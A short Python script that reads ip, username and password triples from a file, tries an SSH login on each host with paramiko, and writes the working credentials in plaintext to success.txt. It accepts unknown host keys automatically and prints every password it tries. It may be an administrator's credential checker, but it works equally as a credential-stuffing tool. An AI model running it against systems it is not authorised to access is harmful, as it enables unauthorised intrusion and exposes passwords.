#!/usr/bin/env python3
# coding: utf-8

import sys
import socket
import datetime

import paramiko
from paramiko import ssh_exception


if len(sys.argv) == 1:
    today = datetime.date.today()
    filename = "/home/password.txt.{0}".format(today.strftime("%Y%m%d"))
else:
    filename = sys.argv[1]

no_connect_list = list()
TIMEOUT = 15

with open(filename, "r") as ff:
    for line in ff:
        line = line.strip()
        tmp = line.split("|<*>|")
        if len(tmp) != 3:
            continue
        else:
            ip, username, password = tmp[0], tmp[1], tmp[2]

        if ip in no_connect_list:
            continue
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print("Trying: {0}@{1} with {2}".format(username, ip, password))
            ssh.connect(ip, 22, username, password, timeout=TIMEOUT)
        except ssh_exception.NoValidConnectionsError:
            no_connect_list.append(ip)
            print("add a no connection ip: {0}".format(ip))
        except (paramiko.SSHException, socket.timeout):
            continue
        else:
            with open("success.txt", "a") as ss:
                ss.write("success with: {0} {1} {2}\n".format(ip, username, password))
            print("success with: {0} {1} {2}".format(ip, username, password))
